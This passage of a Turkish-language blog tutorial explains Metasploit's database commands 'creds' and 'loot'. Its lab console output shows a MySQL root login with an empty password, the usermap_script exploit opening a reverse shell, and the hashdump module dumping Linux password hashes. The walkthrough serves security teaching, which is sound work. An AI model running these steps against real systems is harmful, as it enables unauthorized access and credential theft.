***[*** ******* ***]***  172.16.194.172:3306 MYSQL - Found remote MySQL version 5.0.51a
***[*** ******* ***]***  172.16.194.172:3306 MYSQL - ***[*** 1/2] - Trying username:'root' with password:''
***[*** ******* ***]***  172.16.194.172:3306 - SUCCESSFUL LOGIN 'root' : ''
***[*** ******* ***]***  Scanned 1 of 1 hosts ***(*** 100% complete***)*** 
***[*** ******* ***]***  Auxiliary module execution completed


msf  auxiliary***(*** mysql_login***)***  ***&gt;***  creds 

Credentials
***===========*** 

host            port  user  pass  type      active?
----            ----  ----  ----  ----      -------
172.16.194.172  3306  root        password  true

***[*** ******* ***]***  Found 1 credential.
msf  auxiliary***(*** mysql_login***)***  ***&gt;*** 
</code></pre>
<!-- /wp:code -->


<h3 class="wp-block-heading" id="creds-tablosuna-elle-veri-ekleme">Creds Tablosuna Elle Veri Ekleme
<!-- /wp:heading -->

  Bir sistemde oturum açtığınızda, modül kullanmadan kendiniz bulduğunuz kullanıcı adı ve parola bilgilerini de, aşağıdaki örnekteki formatı kullanarak, sonradan kullanmak üzere&nbsp;<code>creds</code>&nbsp;tablosuna aktarabilirsiniz
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
***[*** ******* ***]***  Time: 2012-06-20 20:31:42 UTC Credential: host***=*** 172.16.194.134 port***=*** 445 proto***=*** tcp sname***=***  type***=*** password user***=*** Administrator pass***=*** 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: active***=*** true

msf ***&gt;***  creds

Credentials
***===========*** 

host            port  user           pass                                                                  type      active?
----            ----  ----           ----                                                                  ----      -------
172.16.194.134  445   Administrator  7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::  password  true

***[*** ******* ***]***  Found 1 credential.
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="loot">Loot
<!-- /wp:heading -->

  Oturum açılan bir sistemde, genellikle ilk olarak&nbsp;<code>hashdump</code>&nbsp;yapılarak hash tablosu çıkarılır. İşte&nbsp;<code>loot</code>&nbsp;komutuyla, tarama sonucu elde edilen hash değerlerinin bilgisi görülebilir. Aşağıdaki örnekte,&nbsp;<code>loot</code>&nbsp;yardım görüntülenmektedir.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  loot -h
Usage: loot 
 Info: loot ***[*** -h***]***  ***[*** addr1 addr2 ...] ***[*** -t ***]*** 
  Add: loot -f ***[*** fname] -i ***[*** info] -a ***[*** addr1 addr2 ...] ***[*** -t ***[*** type***]*** 
  Del: loot -d ***[*** addr1 addr2 ...]

  -a,--add          Add loot to the list of addresses, instead of listing
  -d,--delete       Delete ******* all*******  loot matching host and type
  -f,--file         File with contents of the loot to add
  -i,--info         Info of the loot to add
  -t   Search ***for *** a list of types
  -h,--help         Show this help information
  -S,--search       Search string to filter by
</code></pre>
<!-- /wp:code -->

  Ardından&nbsp;***usermap_script*** &nbsp;modülü kullanılarak karşı sistemde oturum açılmakta ve açılan session yani oturum için,&nbsp;***hashdump*** &nbsp;modülü ile hash değerleri bulunmaktadır. Başarılı olunduğu takdirde bulunan hash değerleri sonradan kullanım için&nbsp;<code>loot</code>&nbsp;tablosuna kayıt edilmektedir.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf  exploit***(*** usermap_script***)***  ***&gt;***  exploit

***[*** ******* ***]***  Started reverse double handler
***[*** ******* ***]***  Accepted the first client connection...
***[*** ******* ***]***  Accepted the second client connection...
***[*** ******* ***]***  Command: echo 4uGPYOrars5OojdL;
***[*** ******* ***]***  Writing to socket A
***[*** ******* ***]***  Writing to socket B
***[*** ******* ***]***  Reading from sockets...
***[*** ******* ***]***  Reading from socket B
***[*** ******* ***]***  B: "4uGPYOrars5OojdL\r\n"
***[*** ******* ***]***  Matching...
***[*** ******* ***]***  A is input...
***[*** ******* ***]***  Command shell session 1 opened ***(*** 172.16.194.163:4444 -&gt; 172.16.194.172:55138***)***  at 2012-06-27 19:38:54 -0400

^Z
Background session 1? ***[*** y/N]  y

msf  exploit***(*** usermap_script***)***  ***&gt;***  use post/linux/gather/hashdump
msf  post***(*** hashdump***)***  ***&gt;***  show options

Module options ***(*** post/linux/gather/hashdump***)*** :

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

msf  post***(*** hashdump***)***  ***&gt;***  sessions -l

Active sessions
***===============*** 

  Id  Type        Information  Connection
  --  ----        -----------  ----------
  1   shell unix               172.16.194.163:4444 -&gt; 172.16.194.172:55138 ***(*** 172.16.194.172***)*** 

msf  post***(*** hashdump***)***  ***&gt;***  run

***[*** +] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
***[*** +] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
***[*** +] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
***[*** +] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
***[*** +] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
***[*** +] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
***[*** +] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
***[*** +] Unshadowed Password File: /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
***[*** ******* ***]***  Post module execution completed
</code></pre>
<!-- /wp:code -->

  Veri tabanında kayıtlı hash değerlerini görmek için&nbsp;<code>loot</code>&nbsp;komutunu vermeniz yeterlidir.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf  post***(*** hashdump***)***  ***&gt;***  loot

Loot
***====*** 

host            service  type          name                   content     info                            path
----            -------  ----          ----                   -------     ----                            ----
172.16.194.172           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
172.16.194.172           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.passwd_953644.txt
172.16.194.172           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.shadow_492948.txt
</code></pre>
<!-- /wp:code -->

  Bu yazımızda,&nbsp;<code>msfconsole</code>&nbsp;içerisinde verilen&nbsp;<code>help</code>&nbsp;komutunda gösterilen&nbsp;<code>Database</code>&nbsp;ile ilgili komutları açıklamaya çalıştık.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">Database Backend Commands
***=========================*** 

    Command           Description
    -------           -----------
    creds             List all credentials ***in *** the database
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file ***(*** filetype will be auto-detected***)*** 
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts ***in *** the database
    loot              List all loot ***in *** the database
    notes             List all notes ***in *** the database
    services          List all services ***in *** the database
    vulns             List all vulnerabilities ***in *** the database
    workspace         Switch between database workspaces
</code></pre>
<!-- /wp:code -->

  <code>vulns</code>&nbsp;komutunu eksik bıraktığımızı düşünebilirsiniz.&nbsp;<code>vulns</code>&nbsp;komutunun ne işe yaradığını az çok tahmin etmek mümkündür. Yazı yeterince uzun oldu.&nbsp;<code>vulns</code>&nbsp;komutunu size bırakıyorum.
 